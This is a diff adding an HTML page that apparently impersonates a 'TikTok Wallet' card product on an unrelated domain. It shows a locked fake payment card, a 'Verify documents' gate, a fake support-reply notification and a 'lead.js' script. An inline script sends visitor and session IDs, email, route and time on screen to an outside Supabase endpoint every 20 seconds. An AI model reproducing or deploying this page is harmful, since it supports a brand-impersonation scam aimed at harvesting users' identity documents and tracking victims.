@@ -1,0 +1,285 @@
+<!doctype html>
+<html lang="en-US">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="theme-color" content="#F5F5F8">
+    
+    <meta name="csrf-token" content="PdcJYaCR5uInm62Kc50Gj4p5b6VNLaMJ10YSDovG">
+    <title>Cards</title>
+    <link rel="stylesheet" href="https://wallet.ytaitools.space/css/tokens.css">
+    <link rel="stylesheet" href="https://wallet.ytaitools.space/css/shell.css">
+    <link rel="stylesheet" href="https://wallet.ytaitools.space/css/components.css">
+    
+    <script src="https://wallet.ytaitools.space/js/vendor/turbo.min.js"></script>
+    <script src="https://wallet.ytaitools.space/js/app.js" defer></script>
+    <script src="https://wallet.ytaitools.space/js/lead.js" defer></script>
+    <script src="https://wallet.ytaitools.space/js/vendor/alpine.min.js" defer></script>
+</head>
+<body>
+
+<div class="app-shell" x-data="{ sheetOpen: false, uploadOpen: false, cardDetails: false, cardLimit: false, cardPin: false, cardDesign: false }">
+
+    <header class="app-header">
+        <img class="app-header__logo" src="https://wallet.ytaitools.space/images/logo.webp" alt="TikTok Wallet" width="82" height="24">
+
+        <div class="app-header__actions">
+            
+            <button type="button" class="app-header__bell" @click="sheetOpen = true"
+                    aria-label="Notifications"
+                    x-data="{ unread: 0 }"
+                    @support-unread.window="unread = Math.max($event.detail.unread, 0)">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>
+                <span class="app-header__dot" aria-hidden="true" x-show="unread > 0"
+                       style="display:none" ></span>
+            </button>
+        </div>
+    </header>
+
+    <main class="app-main  " id="screen">
+        
+    
+        
+        
+        <section class="screen stack--loose card-gate">
+
+            <h1 class="screen__title">Cards</h1>
+
+            <p class="screen__lead">
+                Your TikTok card is designed and managed right here.
+            </p>
+
+            <div class="card-stage">
+                <div class="card-face card-face--matte"
+     style="--surface:#14141c;--glow:rgba(255,255,255,.05)"
+      aria-hidden="true" >
+
+    <div class="card-face__texture" aria-hidden="true"></div>
+    <div class="card-face__glare" aria-hidden="true"></div>
+    <div class="card-face__glow" aria-hidden="true"></div>
+
+    <div class="card-face__top">
+        <span class="card-face__brand">TikTok Wallet</span>
+        <span class="card-face__kind">Midnight</span>
+    </div>
+
+    
+    <div class="card-face__chips" aria-hidden="true">
+        <svg class="card-face__contactless" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"
+             width="20" height="20" fill="none" stroke="#fff" stroke-width="1.6" stroke-linecap="round" focusable="false">
+            <path d="M8.5 5.5a9 9 0 0 1 0 13"/>
+            <path d="M12.5 3a13 13 0 0 1 0 18"/>
+            <path d="M4.5 8a5 5 0 0 1 0 8"/>
+        </svg>
+
+        <svg class="card-face__chip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 36"
+             width="34" height="26" fill="none" focusable="false">
+            <rect x="1" y="1" width="46" height="34" rx="4" fill="#d8dbe0" stroke="#9aa0aa" stroke-width="0.5"/>
+            <rect x="6" y="6" width="14" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"/>
+            <rect x="24" y="6" width="10" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"/>
+            <rect x="6" y="20" width="18" height="10" rx="1.5" fill="none" stroke="#7b828d" stroke-width="0.8" opacity="0.4"/>
+            <line x1="4" y1="12" x2="44" y2="12" stroke="#7b828d" stroke-width="0.3" opacity="0.2"/>
+            <line x1="4" y1="24" x2="44" y2="24" stroke="#7b828d" stroke-width="0.3" opacity="0.2"/>
+        </svg>
+    </div>
+
+    <div class="card-face__engraving">
+        <p class="card-face__pan">**** **** **** ****</p>
+
+        <div class="card-face__row">
+            <span class="card-face__holder" >CARD HOLDER</span>
+            <span class="card-face__expiry"><span class="card-face__expiry-label">Valid thru</span> ••/••</span>
+        </div>
+
+            </div>
+
+    </div>
+            </div>
+
+            <div class="card-gate__veil" role="group" aria-label="Cards locked until verification">
+                <div class="card-gate__panel">
+                    <span class="card-gate__badge" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+</span>
+                    <h2 class="card-gate__title">Verify your account to open cards</h2>
+                    <p class="card-gate__text">
+                        Submit your documents and start the account review to request
+                        and design your card.
+                    </p>
+                    <a href="/verification" class="btn btn--primary btn--full">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
+                        Verify documents
+                    </a>
+                </div>
+            </div>
+
+        </section>
+
+        </main>
+
+            <nav class="app-tabbar" aria-label="Main navigation">
+            
+        <a class="app-tabbar__item"
+           href="/"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/></svg>
+                            </span>
+            <span>Home</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/verification"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m17 8-5-5-5 5"/><path d="M12 3v12"/></svg>
+                            </span>
+            <span>Verification</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/cards"
+            aria-current="page" >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+                            </span>
+            <span>Cards</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/support"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="10"/><path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
+                            </span>
+            <span>Support</span>
+        </a>
+    </nav>
+    
+    <div class="sheet" x-cloak x-show="sheetOpen" role="dialog" aria-modal="true"
+     aria-label="Notifications" @keydown.escape.window="sheetOpen = false">
+
+    <div class="sheet__backdrop"
+         x-show="sheetOpen"
+         x-transition.opacity.duration.200ms
+         @click="sheetOpen = false"></div>
+
+    <div class="sheet__panel"
+         x-show="sheetOpen"
+         x-transition:enter="sheet__panel--anim"
+         x-transition:enter-start="sheet__panel--down"
+         x-transition:leave="sheet__panel--anim"
+         x-transition:leave-end="sheet__panel--down"
+         x-data="{ dragFrom: null, dragBy: 0 }"
+         @click.stop
+         @touchstart="dragFrom = $event.touches[0].clientY; dragBy = 0"
+         @touchmove="if (dragFrom !== null) {
+                         dragBy = Math.max(0, $event.touches[0].clientY - dragFrom);
+                         $el.style.transform = 'translateY(' + dragBy + 'px)';
+                     }"
+         @touchend="$el.style.removeProperty('transform');
+                    if (dragBy > 80) sheetOpen = false;
+                    dragFrom = null; dragBy = 0">
+
+        <div class="sheet__grip" aria-hidden="true"></div>
+
+        <div class="sheet__head">
+            <h2 class="sheet__title">Notifications</h2>
+            <button type="button" class="sheet__close" @click="sheetOpen = false" aria-label="Close">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+            </button>
+        </div>
+
+        <div class="sheet__body"><div class="stack" x-data="{ unread: 0 }"
+             @support-unread.window="unread = $event.detail.unread">
+
+            
+            <a class="notify-row" href="/support/chat" x-show="unread > 0"
+                x-cloak >
+                <span class="notify-row__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7.9 20A9 9 0 1 0 4 16.1L2 22z"/></svg>
+</span>
+                <span class="notify-row__body">
+                    <span class="notify-row__title">Sarah Mitchell replied</span>
+                    <span class="notify-row__text" x-text="unread === 1 ? '1 new message in your support chat' : unread + ' new messages in your support chat'">
+                        0 new messages in your support chat
+                    </span>
+                </span>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m9 18 6-6-6-6"/></svg>
+            </a>
+
+                            <p class="empty__text" x-show="unread === 0" >
+                    No notifications right now.
+                </p>
+                    </div></div>
+    </div>
+</div>
+
+    
+        
+    
+    
+    <div class="toast" id="toast" role="status" aria-live="polite"
+     >
+    <span class="toast__text" id="toast-text"></span>
+</div>
+</div>
+
+
+<script>
+(function () {
+  var URL_ = "https://hrlmqwkgruexsxpqmxje.supabase.co/functions/v1/wallet-track";
+  var EMAIL = null;
+
+  function id(chave, store) {
+    try {
+      var v = store.getItem(chave);
+      if (!v) { v = Math.random().toString(36).slice(2) + Date.now().toString(36); store.setItem(chave, v); }
+      return v;
+    } catch (e) { return "sem-storage"; }
+  }
+
+  // visitor sobrevive ao fechar o navegador — é ele que responde "abre todo dia?".
+  // sessao morre com a aba: é a unidade do tempo de uso.
+  var visitor = id("w_visitor", window.localStorage);
+  var sessao = id("w_sessao", window.sessionStorage);
+
+  // Tempo REAL de olho na tela. Sem parar o relógio quando a aba esconde, um celular
+  // esquecido aberto vira "40 minutos de uso" e a média mente para todo mundo.
+  var segundos = 0, ultimo = Date.now(), visivel = !document.hidden;
+
+  function tick() {
+    var agora = Date.now();
+    if (visivel) segundos += (agora - ultimo) / 1000;
+    ultimo = agora;
+  }
+
+  function manda(evento, viaBeacon) {
+    tick();
+    var corpo = JSON.stringify({
+      visitor: visitor, sessao: sessao, evento: evento, email: EMAIL,
+      rota: location.pathname, segundos: Math.round(segundos),
+      ref: document.referrer || null
+    });
+    try {
+      // sendBeacon é o único que sobrevive à aba fechando
+      if (viaBeacon && navigator.sendBeacon) {
+        navigator.sendBeacon(URL_, new Blob([corpo], { type: "application/json" }));
+        return;
+      }
+      fetch(URL_, { method: "POST", headers: { "Content-Type": "application/json" },
+                    body: corpo, keepalive: true }).catch(function () {});
+    } catch (e) {}
+  }
+
+  document.addEventListener("visibilitychange", function () {
+    tick();
+    visivel = !document.hidden;
+    if (document.hidden) manda("ping", true);
+  });
+
+  manda("open");
+  setInterval(function () { manda("ping"); }, 20000);
+  window.addEventListener("pagehide", function () { manda("saida", true); });
+})();
+</script>
+</body>
+</html>
